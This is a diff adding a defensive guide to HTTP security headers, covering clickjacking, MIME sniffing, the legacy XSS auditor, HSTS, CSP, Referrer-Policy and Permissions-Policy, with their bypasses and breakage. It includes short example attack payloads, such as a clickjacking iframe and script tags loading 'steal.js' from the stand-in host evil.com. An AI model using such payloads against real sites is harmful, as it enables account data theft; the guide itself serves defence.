@@ -2575,6 +2575,195 @@ app.<span class="fn">use</span>((req, res, next) =&gt; {
       </div>
     </div>
   </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>X-Frame-Options — clickjacking, bypasses, and breakage</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it prevents.</strong> Clickjacking: an attacker loads your page inside a transparent <code>&lt;iframe&gt;</code> on <code>evil.com</code>, overlays a fake button on top of your real "Transfer $1000" button, and tricks a logged-in user into clicking through. With <code>X-Frame-Options: DENY</code> (or <code>SAMEORIGIN</code>), the browser refuses to render the iframe at all.</p>
+        <p><strong>Example attack the header blocks:</strong></p>
+<pre class="code-block"><code><span class="cm">&lt;!-- evil.com --&gt;</span>
+<span class="kw">&lt;iframe</span> <span class="fn">src</span>=<span class="str">"https://bank.example.com/transfer"</span>
+        <span class="fn">style</span>=<span class="str">"opacity:0.01;position:absolute;top:0;left:0;"</span><span class="kw">&gt;&lt;/iframe&gt;</span>
+<span class="kw">&lt;button</span> <span class="fn">style</span>=<span class="str">"position:absolute;top:50px;left:50px"</span><span class="kw">&gt;</span>Claim prize<span class="kw">&lt;/button&gt;</span></code></pre>
+        <p><strong>Bypasses &amp; limits:</strong></p>
+        <ul>
+          <li><strong>Only two useful values</strong> — <code>DENY</code> and <code>SAMEORIGIN</code>. The old <code>ALLOW-FROM uri</code> was never supported in Chrome/Safari and is dead. If you need "allow a list of partners to embed", you must use CSP <code>frame-ancestors</code> instead.</li>
+          <li><strong>Old browsers ignore it</strong> — IE &lt; 8, ancient Android browsers. Mitigation: pair with a JavaScript <em>frame-buster</em> (<code>if (top !== self) top.location = self.location</code>), but those can themselves be defeated with the iframe <code>sandbox</code> attribute.</li>
+          <li><strong>Double-framing trick</strong> — nesting the target in an attacker-controlled iframe used to confuse the <code>SAMEORIGIN</code> check on very old browsers. Modern browsers walk the full ancestor chain, so this is fixed.</li>
+        </ul>
+        <p><strong>How it breaks legitimate features:</strong> payment widgets, Zendesk/Intercom chat embeds, Stripe Elements, OAuth "sign in with …" popups that fall back to iframes, preview-in-iframe dashboards (Notion, Confluence), and your own marketing site embedding a live demo.</p>
+        <p><strong>How to prevent breakage:</strong> drop <code>X-Frame-Options</code> entirely on routes that <em>must</em> be embeddable and replace with a targeted CSP: <code>Content-Security-Policy: frame-ancestors 'self' https://partner.example.com https://*.trusted-cdn.com</code>. CSP <code>frame-ancestors</code> supersedes <code>X-Frame-Options</code> when both are present and supports multiple origins.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>X-Content-Type-Options: nosniff — MIME sniffing attacks</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it prevents.</strong> Browsers historically tried to be "helpful" and inspect response bodies to guess the real type. If you served a user-uploaded <code>avatar.jpg</code> whose bytes actually started with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, IE/old Chrome would sniff it as HTML and execute it. <code>nosniff</code> tells the browser: <em>trust my <code>Content-Type</code>, don't second-guess</em>.</p>
+        <p><strong>Example attack the header blocks:</strong></p>
+<pre class="code-block"><code><span class="cm"># User uploads "profile.png" whose bytes begin with:</span>
+<span class="kw">&lt;html&gt;&lt;script&gt;</span>fetch(<span class="str">'/api/me'</span>).then(r=&gt;r.json()).then(send)<span class="kw">&lt;/script&gt;</span>
+
+<span class="cm"># Server replies:   Content-Type: image/png</span>
+<span class="cm"># Without nosniff:  browser sniffs "looks like HTML", renders &amp; runs the script</span>
+<span class="cm"># With nosniff:     browser treats it as a broken image. Safe.</span></code></pre>
+        <p><strong>Bypasses &amp; limits:</strong></p>
+        <ul>
+          <li><strong>Only <code>script</code> and <code>style</code> contexts are strictly enforced</strong> — <code>nosniff</code> blocks a <code>&lt;script src=/upload/evil.jpg&gt;</code> with a non-JS MIME type. It does <em>not</em> fix an attacker who gets you to open the file directly in a new tab with <code>Content-Disposition: inline</code>.</li>
+          <li><strong>Still vulnerable if you set the wrong <code>Content-Type</code> yourself</strong> — the header only disables guessing; it trusts whatever you declared. Serving user content with <code>text/html</code> is still XSS.</li>
+          <li><strong>Download endpoints</strong> — attacker uploads <code>report.pdf</code> that is actually HTML; if your endpoint sets <code>Content-Type: application/pdf</code>, nosniff keeps the browser from rendering it as HTML. Without the header, some browsers still sniffed and rendered.</li>
+        </ul>
+        <p><strong>How it breaks legitimate features:</strong> misconfigured static servers that serve <code>.js</code> as <code>text/plain</code> will suddenly fail to load (the browser refuses to execute). Same for stylesheets served as <code>application/octet-stream</code>, ES modules served without the right MIME, or WASM files served as generic binary.</p>
+        <p><strong>How to prevent breakage:</strong> audit your static server / CDN MIME map — ensure <code>.js</code> → <code>application/javascript</code>, <code>.css</code> → <code>text/css</code>, <code>.mjs</code> → <code>application/javascript</code>, <code>.wasm</code> → <code>application/wasm</code>. Use <code>Content-Disposition: attachment</code> for any user-uploaded downloads so the browser never tries to render them inline.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>X-XSS-Protection — why it's legacy (and sometimes harmful)</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it did.</strong> Older browsers (IE 8+, old Chrome/WebKit) had a heuristic "XSS auditor" that scanned request parameters against the response body; if it saw the same script in both, it blanked the script out. <code>X-XSS-Protection: 1; mode=block</code> forced a full block instead of just filtering.</p>
+        <p><strong>Why it's legacy.</strong> The auditor was <em>itself</em> a security hole. Researchers (Masato Kinugawa and others) showed you could use the filter to <em>remove</em> legitimate defensive scripts, revealing data that would otherwise be hidden — effectively a "script-based CSRF leak." Chrome removed it in 2019, Edge in 2020, Firefox never shipped it. Only old Safari respects it today.</p>
+        <p><strong>Example of the auditor being weaponized:</strong></p>
+<pre class="code-block"><code><span class="cm"># Target page has:</span>
+<span class="kw">&lt;script&gt;</span>if (!isAdmin) document.body.innerHTML = <span class="str">''</span>;<span class="kw">&lt;/script&gt;</span>
+<span class="kw">&lt;div&gt;</span>secret admin data<span class="kw">&lt;/div&gt;</span>
+
+<span class="cm"># Attacker links to:  /page?q=&lt;script&gt;if (!isAdmin)</span>
+<span class="cm"># Auditor sees matching script in URL + body → strips the defensive script</span>
+<span class="cm"># Secret div remains visible. Leak.</span></code></pre>
+        <p><strong>Current best practice:</strong> set <code>X-XSS-Protection: 0</code> to explicitly <em>disable</em> the auditor on any browser that still has it, and rely on a strong CSP for XSS defense. Some hardening libraries still emit <code>1; mode=block</code> by default — override it.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>Strict-Transport-Security (HSTS) — downgrade attacks and footguns</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it prevents.</strong> SSL-stripping / downgrade attacks. A user on hotel wifi types <code>bank.com</code> — the browser sends <code>http://bank.com</code> first, the attacker intercepts, and proxies an HTTPS connection on the user's behalf while feeding them plaintext. HSTS tells the browser "for the next N seconds, never speak plaintext HTTP to this host — upgrade every request to HTTPS locally, before leaving the machine."</p>
+        <p><strong>Canonical directive:</strong></p>
+<pre class="code-block"><code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code></pre>
+        <p><strong>Bypasses &amp; limits:</strong></p>
+        <ul>
+          <li><strong>Trust-on-first-use (TOFU)</strong> — HSTS only kicks in <em>after</em> the first successful HTTPS response. The very first visit on a brand-new device is still hijackable. Fix: submit your domain to the <a href="https://hstspreload.org">Chrome HSTS preload list</a>, which ships with the browser.</li>
+          <li><strong>NTP / clock-skew attacks</strong> — if an attacker can push the victim's clock forward past <code>max-age</code>, the HSTS entry expires and the downgrade becomes possible again (Delorean attack).</li>
+          <li><strong>Only applies to the host that sent it</strong> — without <code>includeSubDomains</code>, an attacker can downgrade <code>insecure-sub.example.com</code> and steal cookies scoped to <code>.example.com</code>.</li>
+        </ul>
+        <p><strong>How it breaks things (and these are real outages):</strong></p>
+        <ul>
+          <li>You enable HSTS with <code>max-age=31536000</code>, then your TLS cert expires or misrenews. Users get a <strong>hard-fail browser error with no "proceed anyway" button</strong> — for a year. You cannot revoke HSTS from the server side; the header is cached client-side.</li>
+          <li>Internal dev hostnames (<code>admin.example.com</code>) that run over plain HTTP for local tooling suddenly refuse to load after you ship <code>includeSubDomains</code>.</li>
+          <li>Preload-list entries are <strong>effectively permanent</strong>. Removal requests take months and still won't reach users who haven't updated their browser.</li>
+        </ul>
+        <p><strong>How to prevent breakage:</strong> roll out in stages — start with <code>max-age=300</code> (5 min), bump to an hour, a day, a week, then a year once you're confident every subdomain is HTTPS-only. Only add <code>preload</code> after the 1-year directive has been live for weeks without incident. Keep a monitored cert-renewal pipeline and alerts on "days until cert expiry &lt; 21."</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>Content-Security-Policy (CSP) — the big one</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it prevents.</strong> Cross-site scripting (XSS), inline-script injection, data exfiltration to attacker servers, and unauthorized framing. You declare an allow-list of sources per resource type, and the browser refuses to load or execute anything outside it.</p>
+        <p><strong>Example attack CSP blocks:</strong> an attacker finds a stored-XSS in a comment field and injects <code>&lt;script src="https://evil.com/steal.js"&gt;&lt;/script&gt;</code>. Without CSP, the browser fetches and runs it. With <code>script-src 'self'</code>, the browser blocks the load and logs a CSP violation.</p>
+        <p><strong>Common bypass patterns (and why they exist):</strong></p>
+        <ul>
+          <li><strong><code>'unsafe-inline'</code></strong> — any page that uses inline <code>&lt;script&gt;</code> or inline event handlers (<code>onclick=</code>) needs this, but it re-opens XSS completely. Fix: switch to <strong>nonces</strong> (<code>script-src 'self' 'nonce-r4nd0m'</code>) or <strong>hashes</strong>.</li>
+          <li><strong>Whitelisted CDNs with JSONP endpoints</strong> — if you allow <code>https://ajax.googleapis.com</code>, an attacker can use its JSONP APIs to load arbitrary JS as "your" code. Google's own researchers published that 94% of real-world CSPs were bypassable this way. Fix: use <strong>strict-dynamic</strong>: <code>script-src 'nonce-xyz' 'strict-dynamic'</code>, which ignores host allow-lists entirely and trusts only scripts started by a nonce'd root.</li>
+          <li><strong>Dangling <code>&lt;base&gt;</code> injection</strong> — if an attacker injects <code>&lt;base href="//evil.com/"&gt;</code>, subsequent relative script URLs resolve to the attacker. Add <code>base-uri 'none'</code> or <code>base-uri 'self'</code>.</li>
+          <li><strong>Object / embed fallthroughs</strong> — forgotten <code>object-src</code> defaults allow Flash/PDF XSS. Always set <code>object-src 'none'</code>.</li>
+          <li><strong>Path-based whitelists don't actually restrict paths</strong> — <code>script-src example.com/safe/</code> still allows <code>example.com/unsafe/evil.js</code> in most browsers (redirects bypass path checks). Treat the host as the smallest unit.</li>
+        </ul>
+        <p><strong>How it breaks legitimate features:</strong> analytics snippets (GA, Segment, Mixpanel) that inject more scripts, Stripe.js, Intercom/Drift chat widgets, Sentry's error reporter, inline styles emitted by <code>styled-components</code>/<code>emotion</code>, Google Maps, YouTube embeds, Cloudflare Turnstile, <code>eval()</code> inside a bundler dev-mode, and browser extensions that try to inject helpers. The first deploy of a strict CSP almost always takes something down.</p>
+        <p><strong>How to prevent breakage:</strong></p>
+        <ul>
+          <li><strong>Ship in report-only mode first:</strong> <code>Content-Security-Policy-Report-Only: ...; report-uri /csp-report</code>. Collect violations for a week or two, fix the real ones.</li>
+          <li><strong>Use nonces + <code>strict-dynamic</code></strong> instead of host allow-lists — resilient to new third-party subresources.</li>
+          <li><strong>Keep an allow-list document</strong> for marketing/analytics; every new vendor request goes through a CSP review.</li>
+          <li><strong>Per-route policies:</strong> your SPA can have a strict CSP, while your <code>/embeds/*</code> route (if any) has a looser one — don't globalize the loosest policy.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>Referrer-Policy — leaks and broken flows</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it prevents.</strong> Accidental leakage of sensitive URL data to third-party sites via the <code>Referer</code> header. Tokens, session IDs, and password-reset links in query strings all leak to every third-party script, image, or link the page loads. The classic incident: a password-reset URL shared over chat, the chat client prefetches the link, and the <code>Referer</code> sent to the target's analytics provider contains the reset token.</p>
+        <p><strong>Common values, strongest to weakest:</strong></p>
+        <ul>
+          <li><code>no-referrer</code> — never send <code>Referer</code>. Safest; breaks some analytics.</li>
+          <li><code>strict-origin-when-cross-origin</code> (modern browser default) — send full URL to same-origin, only the origin to cross-origin HTTPS, nothing on HTTPS→HTTP downgrade. Good default.</li>
+          <li><code>same-origin</code> — send full URL only to same-origin requests; cross-origin gets nothing.</li>
+          <li><code>unsafe-url</code> — send full URL everywhere, including query strings, even HTTPS→HTTP. Never use.</li>
+        </ul>
+        <p><strong>Example leak the header prevents:</strong></p>
+<pre class="code-block"><code><span class="cm"># User opens: https://app.example.com/reset?token=abc123</span>
+<span class="cm"># Page loads:  https://cdn.ads.com/pixel.gif</span>
+
+<span class="cm"># Without Referrer-Policy (old default):</span>
+<span class="cm">#   Referer: https://app.example.com/reset?token=abc123  ← leaked to ad network</span>
+
+<span class="cm"># With strict-origin-when-cross-origin:</span>
+<span class="cm">#   Referer: https://app.example.com                     ← token stripped</span></code></pre>
+        <p><strong>How it breaks things:</strong></p>
+        <ul>
+          <li><strong>Payment processors and identity providers</strong> sometimes require a full <code>Referer</code> for CSRF/anti-fraud checks. Going stricter than they expect causes opaque "Invalid referrer" errors during redirects.</li>
+          <li><strong>Analytics attribution</strong> — a strict policy means GA/Adobe see traffic as "direct / none" instead of attributing to the referring campaign.</li>
+          <li><strong>Federated login</strong> (OAuth) often verifies the <code>Referer</code> on callback; <code>no-referrer</code> can break the flow.</li>
+        </ul>
+        <p><strong>How to prevent breakage:</strong> default to <code>strict-origin-when-cross-origin</code> globally (it's already the browser default, but explicit is better), then <strong>per-page override</strong> with <code>&lt;meta name="referrer" content="origin"&gt;</code> or the <code>referrerpolicy</code> attribute on specific <code>&lt;a&gt;</code>/<code>&lt;img&gt;</code>/<code>&lt;iframe&gt;</code> tags that need a different value. Never put secrets in URL query strings — fix the leak at the source.</p>
+      </div>
+    </div>
+  </div>
+
+  <div class="accordion-item">
+    <button class="accordion-trigger" onclick="toggleAccordion(this)" aria-expanded="false">
+      <span>Permissions-Policy — killing unused capabilities</span>
+      <svg class="chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+    </button>
+    <div class="accordion-content">
+      <div class="accordion-body">
+        <p><strong>What it prevents.</strong> An XSS or compromised third-party script silently activating powerful browser APIs — camera, microphone, geolocation, clipboard read, payment request, USB, Bluetooth, fullscreen trickery, motion sensors. If your app doesn't need those features, Permissions-Policy denies them at the page level so even a successful injection can't turn on the webcam.</p>
+        <p><strong>Example directive:</strong></p>
+<pre class="code-block"><code>Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(),
+  usb=(), accelerometer=(), gyroscope=(), clipboard-read=()</code></pre>
+        <p>Empty parentheses <code>()</code> mean "no origin". <code>self</code> means "this origin only". <code>(self "https://widget.example.com")</code> allows the feature in this page and in iframes from that specific origin.</p>
+        <p><strong>Bypasses &amp; limits:</strong></p>
+        <ul>
+          <li><strong>Older name <code>Feature-Policy</code></strong> is still respected by some browsers. For max compatibility, emit both — the syntax differs: <code>Feature-Policy: camera 'none'; microphone 'none'</code> vs the newer <code>camera=(), microphone=()</code>.</li>
+          <li><strong>Per-iframe <code>allow</code> attribute</strong> — a parent can grant a feature to an iframe even when its own policy forbids it for the top-level document. Audit your <code>&lt;iframe allow="..."&gt;</code> attributes as carefully as the header.</li>
+          <li><strong>Not all APIs are covered</strong> — WebSocket, localStorage, indexeddb, service workers are not gated by Permissions-Policy. It's a sharp tool, not a universal kill switch.</li>
+        </ul>
+        <p><strong>How it breaks legitimate features:</strong> video-call widgets (Daily, LiveKit, Zoom Web SDK) need <code>camera</code>/<code>microphone</code>/<code>display-capture</code>. Map/ride-share pages need <code>geolocation</code>. Apple Pay / Google Pay need <code>payment</code>. Fitness trackers and VR demos need <code>accelerometer</code>/<code>gyroscope</code>/<code>xr-spatial-tracking</code>. Forgetting to allow these produces a confusing <em>silent</em> failure — the API just returns "permission denied" with no hint that the policy is the cause.</p>
+        <p><strong>How to prevent breakage:</strong> start with an <em>allow-list</em> mindset — deny everything, then grant the minimum set per-route. Use the browser devtools "Application → Permissions Policy" panel to see which features the current page is allowed to use. For third-party embeds (e.g. a LiveKit iframe), explicitly grant via the iframe's <code>allow="camera; microphone"</code> attribute <em>and</em> the parent's Permissions-Policy header — both must agree.</p>
+      </div>
+    </div>
+  </div>
 </div>
 
 
